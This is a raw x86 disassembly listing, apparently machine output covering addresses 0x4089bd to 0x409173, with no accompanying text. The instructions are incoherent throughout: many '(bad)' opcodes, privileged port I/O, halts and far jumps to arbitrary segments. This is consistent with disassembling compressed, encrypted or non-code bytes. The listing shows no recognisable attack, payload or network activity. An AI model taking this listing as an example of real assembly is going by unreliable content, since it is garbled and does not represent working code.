  4089bd:	add    eax,0xddfa4bde
  4089c2:	into   
  4089c3:	pop    es
  4089c4:	or     eax,0x4c2894ae
  4089c9:	mov    bl,0x61
  4089cb:	loopne 0x408a03
  4089cd:	inc    eax
  4089ce:	mov    ebx,0xeebf1c1b
  4089d3:	push   edx
  4089d4:	pop    ebx
  4089d5:	sub    dh,ch
  4089d7:	(bad)  
  4089d9:	lock mov dl,0xcf
  4089dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089dd:	scas   al,BYTE PTR es:[edi]
  4089de:	sbb    bh,BYTE PTR [esp+edx*8]
  4089e1:	cld    
  4089e2:	(bad)  
  4089e3:	lods   eax,DWORD PTR ds:[esi]
  4089e4:	imul   esi,DWORD PTR [esi+0x3433b476],0xffffffba
  4089eb:	enter  0xd49c,0x20
  4089ef:	add    DWORD PTR [ebx+ebp*4+0x2e],ebx
  4089f3:	or     eax,0xaba48e14
  4089f8:	mov    bh,0x3b
  4089fa:	shl    BYTE PTR [esi+0x18fc6f6c],cl
  408a00:	repnz mov BYTE PTR [eax-0x41],cl
  408a04:	pop    es
  408a05:	cwde   
  408a06:	push   esi
  408a07:	add    BYTE PTR [ebx],bh
  408a09:	and    DWORD PTR [ecx+0x21383e44],edx
  408a0f:	test   BYTE PTR [esp+esi*2-0x11],bh
  408a13:	sub    ebp,DWORD PTR [esi-0x1d30f7ec]
  408a19:	inc    eax
  408a1a:	mov    edx,0x2f66634c
  408a1f:	jmp    0xb816:0x4c30bd84
  408a26:	dec    ebp
  408a27:	lods   eax,DWORD PTR ds:[esi]
  408a28:	in     eax,0x16
  408a2a:	gs dec ecx
  408a2c:	mov    ds:0x54922984,al
  408a31:	enter  0x79ab,0xfc
  408a35:	lds    esp,FWORD PTR [eax+0x558df374]
  408a3b:	stos   BYTE PTR es:[edi],al
  408a3c:	dec    ebx
  408a3d:	inc    eax
  408a3e:	pop    ebp
  408a3f:	hlt    
  408a40:	add    ebx,DWORD PTR [edx+0x34]
  408a43:	mov    dl,0x17
  408a45:	add    DWORD PTR [edi-0x48],0x62d8672a
  408a4c:	div    BYTE PTR [eax]
  408a4e:	hlt    
  408a4f:	dec    ebx
  408a50:	nop
  408a51:	xor    al,0x36
  408a53:	mov    ds:0xe12589d9,eax
  408a58:	cmp    ebp,DWORD PTR [ebx+0x73]
  408a5b:	test   BYTE PTR [ebp+edi*4+0x49447d88],al
  408a62:	cmp    al,0x7c
  408a64:	outs   dx,DWORD PTR ds:[esi]
  408a65:	inc    esp
  408a66:	push   0x43
  408a68:	or     al,0x8b
  408a6a:	adc    DWORD PTR [edi+0x75],edi
  408a6d:	xchg   edi,eax
  408a6e:	or     bh,bl
  408a70:	mov    ebp,0xfd4391df
  408a75:	xchg   ebx,eax
  408a76:	jg     0x408a64
  408a78:	clc    
  408a79:	cmc    
  408a7a:	(bad)  
  408a7b:	neg    DWORD PTR [ebx-0x7c6bb610]
  408a81:	sub    al,0x84
  408a83:	stos   DWORD PTR es:[edi],eax
  408a84:	xor    eax,0xbccfdf40
  408a89:	out    dx,al
  408a8a:	fbstp  TBYTE PTR [edi]
  408a8c:	not    DWORD PTR [edi]
  408a8e:	sbb    BYTE PTR [eax],dl
  408a90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a91:	jecxz  0x408aee
  408a93:	sbb    ebp,0x5c
  408a96:	mov    al,0xa3
  408a98:	mov    ?,WORD PTR [eax]
  408a9a:	pop    esi
  408a9b:	add    DWORD PTR [edx],edi
  408a9d:	out    dx,eax
  408a9e:	pop    ds
  408a9f:	popf   
  408aa0:	mov    ebp,0x1193af3
  408aa5:	bound  ebp,QWORD PTR [eax+0x297b9ddf]
  408aab:	vandnps xmm4,xmm1,XMMWORD PTR [ebp+0x57]
  408ab0:	sar    DWORD PTR [eax-0x4de1101b],1
  408ab6:	shl    BYTE PTR [ecx+0x4c],cl
  408ab9:	xchg   esi,eax
  408aba:	daa    
  408abb:	jecxz  0x408a78
  408abd:	fbld   TBYTE PTR [esi]
  408abf:	ficom  WORD PTR [ecx+0x4a]
  408ac2:	cld    
  408ac3:	and    BYTE PTR [ebp-0xa],bh
  408ac6:	or     dl,al
  408ac8:	dec    eax
  408ac9:	sub    dh,bh
  408acb:	pushf  
  408acc:	aam    0x59
  408ace:	mov    bh,0x9
  408ad0:	push   esp
  408ad1:	cmp    eax,0xcd3de76f
  408ad6:	dec    ebx
  408ad7:	outs   dx,BYTE PTR ds:[esi]
  408ad8:	mov    cl,0xf7
  408ada:	or     DWORD PTR [eax+esi*4-0x5b],edx
  408ade:	push   cs
  408adf:	fwait
  408ae0:	cmp    dl,ch
  408ae2:	inc    eax
  408ae3:	pop    eax
  408ae4:	sub    cl,dl
  408ae6:	bound  esi,QWORD PTR [ecx+0x7c]
  408ae9:	xchg   DWORD PTR [eax-0x7bcc077e],eax
  408aef:	dec    eax
  408af0:	aam    0xdd
  408af2:	das    
  408af3:	mov    ecx,0x87d32eb2
  408af8:	add    eax,0xa76ada89
  408afd:	xchg   BYTE PTR [ecx+esi*1],bl
  408b00:	enter  0xfcdd,0x1a
  408b04:	adc    edi,DWORD PTR [ecx]
  408b06:	xchg   edi,eax
  408b07:	out    0x94,al
  408b09:	sahf   
  408b0a:	ss jg  0x408b5d
  408b0d:	fild   DWORD PTR [eax+0x70a4d40]
  408b13:	cwde   
  408b14:	mov    eax,0x675c50b3
  408b19:	mov    edi,DWORD PTR [esp+ebx*2]
  408b1c:	cld    
  408b1d:	xchg   esi,eax
  408b1e:	jmp    DWORD PTR [esi-0x27]
  408b21:	aam    0x62
  408b23:	push   0xffffffb9
  408b25:	sub    eax,DWORD PTR [eax]
  408b27:	or     DWORD PTR [esi],esp
  408b29:	inc    edx
  408b2a:	dec    esi
  408b2b:	ror    cl,1
  408b2d:	jno    0x408b09
  408b2f:	call   0xd4cef57a
  408b34:	mov    dh,0x11
  408b36:	test   DWORD PTR [ebx-0x67f8b265],0xac2eb538
  408b40:	int3   
  408b41:	add    eax,0x46163d77
  408b46:	int    0x22
  408b48:	push   ss
  408b49:	int    0x35
  408b4b:	out    dx,al
  408b4c:	sub    BYTE PTR [esp+ebx*1+0x5a3974cb],bh
  408b53:	xlat   BYTE PTR ds:[ebx]
  408b54:	xchg   edx,eax
  408b55:	scas   al,BYTE PTR es:[edi]
  408b56:	or     DWORD PTR [edi-0x6041167c],0xffffffaf
  408b5d:	dec    esi
  408b5e:	(bad)  
  408b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b60:	scas   al,BYTE PTR es:[edi]
  408b61:	nop
  408b62:	es pop edi
  408b64:	dec    ebx
  408b65:	inc    esp
  408b66:	pushf  
  408b67:	ror    BYTE PTR [eax+0x3d],1
  408b6a:	repz xchg edx,eax
  408b6c:	shl    dl,0xa8
  408b6f:	add    esi,DWORD PTR [ecx+0x7b]
  408b72:	push   ss
  408b73:	int3   
  408b74:	mov    ch,0x4e
  408b76:	ds xor edi,ebp
  408b79:	ss xchg bl,ch
  408b7c:	and    DWORD PTR [edx+0x1d81f74b],ebx
  408b82:	xor    bl,BYTE PTR ds:0x42bd8585
  408b88:	test   al,0xd2
  408b8a:	leave  
  408b8b:	or     al,0xf
  408b8d:	sub    al,0xec
  408b8f:	add    ch,BYTE PTR [ebx+0x5d]
  408b92:	adc    eax,eax
  408b94:	xchg   ecx,eax
  408b95:	loopne 0x408bcf
  408b97:	lea    edx,[eax-0x250ad8c7]
  408b9d:	nop
  408b9e:	pop    esi
  408b9f:	fld    QWORD PTR [esi-0x3621f02c]
  408ba5:	cmp    al,0x7e
  408ba7:	dec    esi
  408ba8:	(bad)  
  408ba9:	mov    ecx,0xff2fc76a
  408bae:	lods   al,BYTE PTR ds:[esi]
  408baf:	mov    esi,0xf407726
  408bb4:	iret   
  408bb5:	pop    ebx
  408bb6:	aad    0x6
  408bb8:	push   cs
  408bb9:	add    eax,0xc770f8b7
  408bbe:	pop    edi
  408bbf:	dec    esp
  408bc0:	in     eax,dx
  408bc1:	adc    bl,bl
  408bc3:	addr16 or dl,bh
  408bc6:	arpl   WORD PTR ds:0x5ea8bdef,di
  408bcc:	shl    BYTE PTR [ecx-0x28bc7b89],0x5c
  408bd3:	push   0xffffffdb
  408bd5:	fcom   DWORD PTR [eax]
  408bd7:	std    
  408bd8:	cmp    eax,0xa0926b2f
  408bdd:	add    BYTE PTR [edx],bh
  408bdf:	xchg   ebp,eax
  408be0:	or     DWORD PTR [ecx+0x69],edx
  408be3:	sbb    edi,0x14
  408be6:	std    
  408be7:	aaa    
  408be8:	test   al,0xee
  408bea:	xchg   esp,eax
  408beb:	sbb    DWORD PTR [edx+0x2d],ebx
  408bee:	in     eax,dx
  408bef:	out    dx,eax
  408bf0:	inc    esp
  408bf1:	push   eax
  408bf2:	js     0x408bc0
  408bf4:	iret   
  408bf5:	cmp    ecx,DWORD PTR [ebp-0x2f6c706b]
  408bfb:	aaa    
  408bfc:	sbb    BYTE PTR [eax+0xd],0xf6
  408c00:	hlt    
  408c01:	repnz push es
  408c03:	leave  
  408c04:	int3   
  408c05:	sub    BYTE PTR [esi-0x43765570],al
  408c0b:	adc    dl,dh
  408c0d:	pop    ss
  408c0e:	popf   
  408c0f:	lds    ecx,FWORD PTR [ecx]
  408c11:	fs inc edx
  408c13:	pop    ecx
  408c14:	sbb    BYTE PTR [edx],0xc
  408c17:	sub    BYTE PTR [edx-0x5afe6ecf],dh
  408c1d:	lahf   
  408c1e:	data16 and ah,BYTE PTR [ebp-0x41d52c73]
  408c25:	cdq    
  408c26:	std    
  408c27:	and    BYTE PTR [edi+0x37],bl
  408c2a:	pop    ss
  408c2b:	andps  xmm6,XMMWORD PTR [esi+ebp*2+0x4c5b879d]
  408c33:	inc    edi
  408c34:	fild   QWORD PTR [esi]
  408c36:	hlt    
  408c37:	xchg   ebx,eax
  408c38:	add    DWORD PTR [ecx-0x3a],eax
  408c3b:	nop
  408c3c:	adc    al,bl
  408c3e:	aam    0x6b
  408c40:	jp     0x408c1c
  408c42:	repnz fild QWORD PTR ds:0x6c1762da
  408c49:	push   cs
  408c4a:	push   eax
  408c4b:	push   esp
  408c4c:	mov    ecx,0x10b21eed
  408c51:	and    BYTE PTR [ecx-0x62a87892],bh
  408c57:	call   DWORD PTR [ecx]
  408c59:	jb     0x408cbd
  408c5b:	lds    esp,FWORD PTR [ecx+ebx*2-0x240f09df]
  408c62:	jbe    0x408c7c
  408c64:	out    0xbd,al
  408c66:	popf   
  408c67:	imul   edi,DWORD PTR [ebp-0x7d170589],0xffffff88
  408c6e:	mov    ch,0x26
  408c70:	inc    esp
  408c71:	xor    DWORD PTR [edi],esi
  408c73:	sahf   
  408c74:	xchg   DWORD PTR [eax+esi*8],ebx
  408c77:	jmp    FWORD PTR [ecx+0x4e1423cd]
  408c7d:	dec    edx
  408c7e:	dec    ebp
  408c7f:	div    DWORD PTR [esi]
  408c81:	es mov edi,0x952ae126
  408c87:	int3   
  408c88:	pop    esi
  408c89:	js     0x408cf7
  408c8b:	es ins BYTE PTR es:[edi],dx
  408c8d:	adc    bh,BYTE PTR [edx]
  408c8f:	push   edx
  408c90:	les    edi,FWORD PTR [edx]
  408c92:	ss pusha 
  408c94:	int3   
  408c95:	mov    esi,0xa98f6c1f
  408c9a:	int    0x7c
  408c9c:	and    dh,0xf9
  408c9f:	mov    esp,DWORD PTR [ebx-0x25]
  408ca2:	mov    edx,0x3b1db83d
  408ca7:	(bad)  
  408ca8:	jmp    0xfba6:0xcde43ccc
  408caf:	mov    bh,0x19
  408cb1:	or     al,0x6b
  408cb3:	push   esp
  408cb4:	repnz mov WORD PTR [edx+0x2900789d],ss
  408cbb:	add    DWORD PTR [edx-0x754e4226],esi
  408cc1:	adc    DWORD PTR [ecx+0x53],0x4df89ab1
  408cc8:	sub    edx,esp
  408cca:	cmc    
  408ccb:	pop    ecx
  408ccc:	(bad)  
  408ccd:	and    al,0xf0
  408ccf:	jl     0x408d07
  408cd1:	dec    eax
  408cd2:	pop    es
  408cd3:	sbb    al,0x8
  408cd5:	aas    
  408cd6:	push   ds
  408cd7:	fist   DWORD PTR [esi]
  408cd9:	jno    0x408caa
  408cdb:	out    dx,eax
  408cdc:	(bad)  
  408cde:	cwde   
  408cdf:	xlat   BYTE PTR ds:[ebx]
  408ce0:	outs   dx,DWORD PTR ds:[esi]
  408ce1:	lahf   
  408ce2:	scas   al,BYTE PTR es:[edi]
  408ce3:	stos   DWORD PTR es:[edi],eax
  408ce4:	or     DWORD PTR [ecx+ecx*2-0x58698291],ebp
  408ceb:	jecxz  0x408ca4
  408ced:	icebp  
  408cee:	mov    al,ds:0x327976ad
  408cf3:	xor    ebp,DWORD PTR [edx]
  408cf5:	xchg   edx,eax
  408cf6:	fucomi st,st(0)
  408cf8:	leave  
  408cf9:	leave  
  408cfa:	mov    ebx,0xbb0fb64c
  408cff:	sub    ah,0xb1
  408d02:	mov    cl,BYTE PTR [ebx-0x34e66d2c]
  408d08:	rcl    BYTE PTR [edi],1
  408d0a:	sbb    dh,BYTE PTR [ebp+0xd]
  408d0d:	mov    ds:0x877c45c0,al
  408d12:	jbe    0x408cd9
  408d14:	shl    ch,cl
  408d16:	js     0x408d55
  408d18:	push   ds
  408d19:	mov    DWORD PTR [edx-0x6d],edi
  408d1c:	push   ss
  408d1d:	sub    ch,BYTE PTR [eax-0x50e8352f]
  408d23:	adc    bl,BYTE PTR [ebx]
  408d25:	rcl    BYTE PTR [edi],1
  408d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d28:	jno    0x408cef
  408d2a:	fdiv   DWORD PTR [esi]
  408d2c:	fimul  DWORD PTR [eax-0x51]
  408d2f:	add    eax,0x34d21f23
  408d34:	xor    al,0xce
  408d36:	mov    edx,0x7bad0f50
  408d3b:	and    BYTE PTR [eax],ah
  408d3d:	mov    BYTE PTR [eax],ch
  408d3f:	in     al,dx
  408d40:	ss cli 
  408d42:	sbb    eax,eax
  408d44:	lahf   
  408d45:	rcl    DWORD PTR [edx],1
  408d47:	sub    edi,DWORD PTR [edx+eax*4]
  408d4a:	mov    ds:0xc5f48f37,eax
  408d4f:	adc    BYTE PTR [eax+0x752c4b1e],bl
  408d55:	add    DWORD PTR [ecx-0x44840b64],edi
  408d5b:	aam    0xab
  408d5d:	ror    BYTE PTR [ecx+0x129c5604],0x98
  408d64:	mov    dl,0x5f
  408d66:	stos   BYTE PTR es:[edi],al
  408d67:	mov    dh,0x56
  408d69:	sahf   
  408d6a:	cmp    DWORD PTR ds:0x7e7a45e9,ecx
  408d70:	mov    ebx,0xaa5b1dd2
  408d75:	mov    DWORD PTR [edx],edx
  408d77:	inc    edi
  408d78:	dec    eax
  408d79:	mov    edi,0x600d6952
  408d7e:	scas   eax,DWORD PTR es:[edi]
  408d7f:	xor    BYTE PTR [eax*8+0x1dfab528],ah
  408d86:	ds aad 0xb7
  408d89:	mov    bh,0x68
  408d8b:	jp     0x408d42
  408d8d:	mov    ds:0xdc9a1172,eax
  408d92:	inc    edi
  408d93:	and    al,0xe8
  408d95:	jmp    0x958f3e90
  408d9a:	cs jecxz 0x408d52
  408d9d:	mov    eax,0xe9402ca6
  408da2:	dec    ebx
  408da3:	sbb    DWORD PTR [ebp+ebp*2-0x3c],ebp
  408da7:	xor    al,0xb5
  408da9:	sbb    DWORD PTR [eax+0x43],0xfffffff2
  408dad:	imul   ecx,DWORD PTR [esi-0x7662e4d7],0xffffff8c
  408db4:	xor    ebp,0x1
  408db7:	(bad)  
  408db8:	jp     0x408dde
  408dba:	sub    BYTE PTR [edx+esi*8+0x69],dh
  408dbe:	or     dh,dh
  408dc0:	fidiv  WORD PTR [ebx+0x49129642]
  408dc6:	fwait
  408dc7:	jg     0x408d65
  408dc9:	imul   ecx,DWORD PTR [eax],0xdaa81261
  408dcf:	or     al,0x49
  408dd1:	xchg   esp,eax
  408dd2:	cdq    
  408dd3:	(bad)  
  408dd4:	mov    WORD PTR [esi-0x3484feb5],ds
  408dda:	xchg   dl,ah
  408ddc:	stos   BYTE PTR es:[edi],al
  408ddd:	add    edi,DWORD PTR [esi+ebx*8-0x580e2db0]
  408de4:	inc    ecx
  408de5:	popf   
  408de6:	mov    esi,0xfafe5f12
  408deb:	dec    esi
  408dec:	sub    al,BYTE PTR [eax+0x12]
  408def:	popa   
  408df0:	and    BYTE PTR [ecx-0x587f854a],ah
  408df6:	les    ecx,FWORD PTR [ecx+ebx*1+0x72]
  408dfa:	jbe    0x408d8a
  408dfc:	push   ebx
  408dfd:	cmp    BYTE PTR [edi],bh
  408dff:	mov    DWORD PTR [edi],edi
  408e01:	test   al,0xa5
  408e03:	mov    ah,0xfa
  408e05:	or     eax,0xa1bbbe0f
  408e0a:	jp     0x408da0
  408e0c:	xchg   esp,eax
  408e0d:	push   es
  408e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e0f:	dec    ecx
  408e10:	(bad)  
  408e11:	mov    dh,0xe9
  408e13:	or     DWORD PTR [esi-0x7b],ecx
  408e16:	jle    0x408e64
  408e18:	jge    0x408e8c
  408e1a:	push   es
  408e1b:	inc    eax
  408e1c:	scas   al,BYTE PTR es:[edi]
  408e1d:	std    
  408e1e:	inc    ebp
  408e1f:	(bad)  
  408e20:	mov    ebx,edi
  408e22:	mov    ds:0x80ddf863,eax
  408e27:	jbe    0x408e17
  408e29:	sti    
  408e2a:	aas    
  408e2b:	ins    BYTE PTR es:[edi],dx
  408e2c:	aam    0xf8
  408e2e:	sbb    ebx,edx
  408e30:	push   esi
  408e31:	(bad)  
  408e32:	push   esp
  408e33:	sbb    BYTE PTR [eax],0xbf
  408e36:	mov    al,BYTE PTR [ecx-0x7a85278a]
  408e3c:	push   ebx
  408e3d:	sti    
  408e3e:	mov    dl,0x4d
  408e40:	int    0xaa
  408e42:	outs   dx,BYTE PTR ds:[esi]
  408e43:	sub    esi,ebx
  408e45:	mov    ch,0x23
  408e47:	fwait
  408e48:	rcr    BYTE PTR [ebp-0x788550d8],cl
  408e4e:	scas   eax,DWORD PTR es:[edi]
  408e4f:	or     esp,DWORD PTR [edi+edi*2-0x51]
  408e53:	enter  0x719b,0x1a
  408e57:	gs std 
  408e59:	xor    cl,BYTE PTR [ebx-0x3a]
  408e5c:	lds    ecx,FWORD PTR [ebx-0xe]
  408e5f:	xchg   esp,eax
  408e60:	repz push ebx
  408e62:	add    eax,0xfe66b4ad
  408e67:	jb     0x408e28
  408e69:	es stos BYTE PTR es:[edi],al
  408e6b:	push   0x60c45d70
  408e70:	sub    al,0xcd
  408e72:	or     BYTE PTR [edx-0x3],bh
  408e75:	sbb    eax,0x66433897
  408e7a:	adc    eax,0xa6e6772a
  408e7f:	fs jle 0x408e64
  408e82:	out    dx,al
  408e83:	mov    ebx,0x24a74a71
  408e88:	mov    ebx,0x3352a0bf
  408e8d:	loopne 0x408e7a
  408e8f:	retf   
  408e90:	mov    ebx,0x9042fb1c
  408e95:	mov    edi,DWORD PTR [ebx]
  408e97:	mov    dl,0x90
  408e99:	sbb    edi,DWORD PTR [ecx+0x17]
  408e9c:	cwde   
  408e9d:	fwait
  408e9e:	ins    DWORD PTR es:[edi],dx
  408e9f:	and    DWORD PTR [eax-0x2b],eax
  408ea2:	push   esi
  408ea3:	enter  0x7119,0x67
  408ea7:	xor    ch,BYTE PTR [edx-0x2d90eadd]
  408ead:	lods   eax,DWORD PTR ds:[esi]
  408eae:	rol    DWORD PTR [ebp+0x13],1
  408eb1:	pop    ebp
  408eb2:	sbb    dl,bl
  408eb4:	in     eax,0xcc
  408eb6:	or     ch,BYTE PTR [eax+ebx*4-0x6a99a1db]
  408ebd:	jmp    0x3b3a:0x25f6a7e2
  408ec4:	push   edx
  408ec5:	in     al,0x40
  408ec7:	mov    eax,ds:0x55687d59
  408ecc:	test   BYTE PTR [eax],dl
  408ece:	push   edx
  408ecf:	jg     0x408e71
  408ed1:	cmp    eax,0xd8278ec5
  408ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed7:	in     al,0x8
  408ed9:	adc    eax,0xcc99d971
  408ede:	(bad)  
  408edf:	mov    cl,0x20
  408ee1:	cmp    al,0x5
  408ee3:	(bad)  
  408ee4:	outs   dx,BYTE PTR ds:[esi]
  408ee5:	cmc    
  408ee6:	pop    ss
  408ee7:	sub    dl,BYTE PTR gs:[ebx+0x3e]
  408eeb:	sti    
  408eec:	(bad)  [esi-0x7c20b255]
  408ef2:	retf   
  408ef3:	adc    al,0x6a
  408ef5:	or     eax,0xde2e3141
  408efa:	call   0xeadf:0x73d88aaf
  408f01:	jle    0x408eef
  408f03:	inc    eax
  408f04:	and    esi,esi
  408f06:	inc    edx
  408f07:	cmc    
  408f08:	push   0x56f775a9
  408f0d:	scas   al,BYTE PTR es:[edi]
  408f0e:	sub    eax,0x4f997366
  408f13:	repz sub BYTE PTR [esi+0x629985c8],dl
  408f1a:	outs   dx,BYTE PTR ds:[esi]
  408f1b:	mov    cl,0xf8
  408f1d:	in     al,0xa1
  408f1f:	out    0x4b,al
  408f21:	cdq    
  408f22:	jle    0x408f73
  408f24:	sub    eax,ebx
  408f26:	jbe    0x408ee8
  408f28:	dec    ebp
  408f29:	rol    DWORD PTR [esi],cl
  408f2b:	iret   
  408f2c:	jmp    0x2e5b6824
  408f31:	addr16 pop ecx
  408f33:	xor    al,BYTE PTR [eax]
  408f35:	repnz and al,0x73
  408f38:	sub    bh,BYTE PTR [ebp+0x44]
  408f3b:	(bad)  
  408f3c:	clc    
  408f3d:	and    dh,0x55
  408f40:	mov    ecx,DWORD PTR [esp+edx*4]
  408f43:	add    ecx,DWORD PTR [ebx+0x6488dd6c]
  408f49:	loope  0x408f69
  408f4b:	fwait
  408f4c:	jbe    0x408fb7
  408f4e:	hlt    
  408f4f:	scas   eax,DWORD PTR es:[edi]
  408f50:	jge    0x408ef4
  408f52:	pop    esi
  408f53:	jbe    0x408fd1
  408f55:	xor    al,0xa3
  408f57:	cmp    BYTE PTR [ebx+0x591ec30],dl
  408f5d:	add    ebp,DWORD PTR [eax+eax*1+0x62]
  408f61:	sbb    DWORD PTR [ebx-0x4ad88c5e],ebp
  408f67:	push   ebp
  408f68:	add    BYTE PTR [edi],cl
  408f6a:	ret    0xa6d0
  408f6d:	push   0x757bef3d
  408f72:	and    ebp,ecx
  408f74:	mov    al,BYTE PTR [esi-0x7fc77fd5]
  408f7a:	aam    0xd5
  408f7c:	lds    edi,FWORD PTR ds:0x787b0233
  408f82:	xlat   BYTE PTR ds:[ebx]
  408f83:	dec    esp
  408f84:	lods   eax,DWORD PTR ds:[esi]
  408f85:	mov    dh,0x89
  408f88:	sub    eax,0x44824688
  408f8d:	push   ebp
  408f8e:	mov    ebp,0x5fc11c5d
  408f93:	ja     0x408f94
  408f95:	(bad)  
  408f96:	fdiv   QWORD PTR [eax+0x83edf6d]
  408f9c:	clc    
  408f9d:	fimul  DWORD PTR [ebp-0x7293aa26]
  408fa3:	inc    eax
  408fa4:	lahf   
  408fa5:	pop    es
  408fa6:	fldenv [ebp+0x580b715c]
  408fac:	dec    eax
  408fad:	inc    esi
  408fae:	shr    BYTE PTR [edi],cl
  408fb0:	push   ds
  408fb1:	push   0x10
  408fb3:	rcl    DWORD PTR [edx-0x79],0x0
  408fb7:	cmp    eax,0x97dba43a
  408fbc:	and    BYTE PTR [edx+0x45d84d39],bh
  408fc2:	and    DWORD PTR [edi],ecx
  408fc4:	sahf   
  408fc5:	push   ds
  408fc6:	mov    cl,0x56
  408fc8:	jmp    0x7a44:0xc676fe79
  408fcf:	push   edx
  408fd0:	mov    esi,0xe9915014
  408fd5:	cmp    ah,BYTE PTR [eax+0x3be505ef]
  408fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fdc:	push   ecx
  408fdd:	and    dh,dh
  408fdf:	clc    
  408fe0:	pop    ebx
  408fe1:	ds mov edi,0xc72aa7dc
  408fe7:	test   BYTE PTR [edx+0x7aba4912],ch
  408fed:	mov    bl,0x6f
  408fef:	sahf   
  408ff0:	hlt    
  408ff1:	into   
  408ff2:	pop    edi
  408ff3:	add    eax,0x3a310240
  408ff8:	sbb    bl,ah
  408ffa:	popa   
  408ffb:	lahf   
  408ffc:	jmp    0x81035e86
  409001:	mov    ebp,0xd146adc1
  409006:	sub    BYTE PTR [edi+0x8],cl
  409009:	pushf  
  40900a:	mov    ebx,0xed2d6b0b
  40900f:	xchg   edi,eax
  409010:	imul   esp,DWORD PTR [ebx],0xce1cf6d8
  409016:	xor    dl,BYTE PTR [edx+ecx*2]
  409019:	xbegin 0xa4e1d2c5
  40901f:	cs jne 0x40907c
  409022:	call   FWORD PTR [ecx]
  409024:	inc    BYTE PTR [ebx-0x7a918283]
  40902a:	icebp  
  40902b:	sub    bl,BYTE PTR [edx]
  40902d:	retf   0x892f
  409030:	clc    
  409031:	loopne 0x409099
  409033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409034:	nop
  409035:	mov    dl,0x99
  409037:	aad    0x4c
  409039:	dec    eax
  40903a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40903b:	test   eax,0xf7ed1324
  409040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409041:	jmp    0x9e4e:0xabadfcf
  409048:	push   ebx
  409049:	les    ecx,FWORD PTR [esi+0x2c]
  40904c:	xor    eax,0x3eb9d95c
  409051:	in     eax,0xaf
  409053:	xchg   ebx,eax
  409054:	cli    
  409055:	clc    
  409056:	and    BYTE PTR ds:0xe9181ae,bh
  40905c:	mov    cl,0x58
  40905e:	mov    ch,0x77
  409060:	imul   edi,DWORD PTR [edx-0x58],0xc2b15ca9
  409067:	push   eax
  409068:	pop    eax
  409069:	test   DWORD PTR [esi],0x9a192c05
  40906f:	sahf   
  409070:	shr    BYTE PTR [ecx+0x387d2905],1
  409076:	cld    
  409077:	scas   al,BYTE PTR es:[edi]
  409078:	xor    DWORD PTR [edi+0x27942e56],esp
  40907e:	jg     0x4090ce
  409080:	inc    edx
  409081:	mov    bh,0x22
  409083:	xlat   BYTE PTR ds:[ebx]
  409084:	repnz mov edi,DWORD PTR [edx+0x1c]
  409088:	inc    eax
  409089:	cmovae esp,DWORD PTR [ecx+0x326686ab]
  409090:	hlt    
  409091:	dec    esi
  409092:	jmp    0x994a:0xc78a1737
  409099:	or     BYTE PTR [edi],cl
  40909b:	je     0x4090ef
  40909d:	mov    ebp,0x777b3a90
  4090a2:	xchg   edi,eax
  4090a3:	mov    ebx,0xab22c0ad
  4090a8:	xor    DWORD PTR [ebx+edi*4+0x621f3ad8],esp
  4090af:	sbb    al,0x4b
  4090b1:	sti    
  4090b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b3:	adc    ebx,ebx
  4090b5:	mov    BYTE PTR [edx+ebp*2],ah
  4090b8:	push   edx
  4090b9:	mov    bl,0x2f
  4090bb:	fisttp DWORD PTR [ebp-0x6f]
  4090be:	pop    ds
  4090bf:	fcomp  DWORD PTR [esi]
  4090c1:	xchg   edi,eax
  4090c2:	add    esp,esi
  4090c4:	std    
  4090c5:	mov    ah,0x85
  4090c7:	in     al,dx
  4090c8:	and    al,0xc0
  4090ca:	push   cs
  4090cb:	fdivp  st(5),st
  4090cd:	jb     0x40913e
  4090cf:	lock pop edx
  4090d1:	ror    DWORD PTR [edx-0x25],0x7f
  4090d5:	popf   
  4090d6:	push   ebp
  4090d7:	mov    ah,0xa0
  4090d9:	out    dx,eax
  4090da:	pop    es
  4090db:	popa   
  4090dc:	int    0x30
  4090de:	popf   
  4090df:	sub    eax,0x81b07ee3
  4090e4:	loope  0x40912c
  4090e6:	(bad)  
  4090e7:	enter  0x20b,0xbd
  4090eb:	icebp  
  4090ec:	fist   WORD PTR [edi-0x6b37dde1]
  4090f2:	mov    eax,0x5ef728ed
  4090f7:	outs   dx,BYTE PTR ds:[esi]
  4090f8:	jmp    0x259c5ee2
  4090fd:	icebp  
  4090fe:	and    DWORD PTR [esi+0x438c924e],edx
  409104:	inc    BYTE PTR [esi]
  409106:	ins    BYTE PTR es:[edi],dx
  409107:	or     DWORD PTR [ebx],edx
  409109:	sahf   
  40910a:	mov    esp,0xf200e5da
  40910f:	mov    bh,0x45
  409111:	call   0xefb374c4
  409116:	into   
  409117:	or     bh,BYTE PTR [ebp-0x64]
  40911a:	imul   ebx
  40911c:	sahf   
  40911d:	inc    eax
  40911e:	mov    bl,dl
  409120:	jmp    0x409124
  409122:	int    0x30
  409124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409125:	jge    0x409179
  409127:	mul    DWORD PTR [esi]
  409129:	iret   
  40912a:	jmp    0x4090c1
  40912c:	sbb    al,0xdf
  40912e:	mov    al,ds:0x2f73a6d7
  409133:	push   0x49ef4f5d
  409138:	inc    esi
  409139:	sub    DWORD PTR [edi+0x6ee6573c],0x66916e5f
  409143:	cwde   
  409144:	and    bh,BYTE PTR [ebp+0x7149ddfb]
  40914a:	shr    edx,cl
  40914c:	stos   DWORD PTR es:[edi],eax
  40914d:	mov    bh,ah
  40914f:	out    dx,eax
  409150:	sub    ecx,esp
  409152:	xor    dh,BYTE PTR [eax-0x644ed13d]
  409158:	hlt    
  409159:	and    esp,ebp
  40915b:	ins    DWORD PTR es:[edi],dx
  40915c:	rcl    BYTE PTR [edx],0x3d
  40915f:	sbb    DWORD PTR [eax],edi
  409161:	out    0x4,eax
  409163:	imul   DWORD PTR [esi-0x64]
  409166:	test   ch,bl
  409168:	fs jg  0x409107
  40916b:	pop    ecx
  40916c:	cmp    DWORD PTR [ecx],0x769c52ac
  409172:	sahf   
  409173:	push   ss
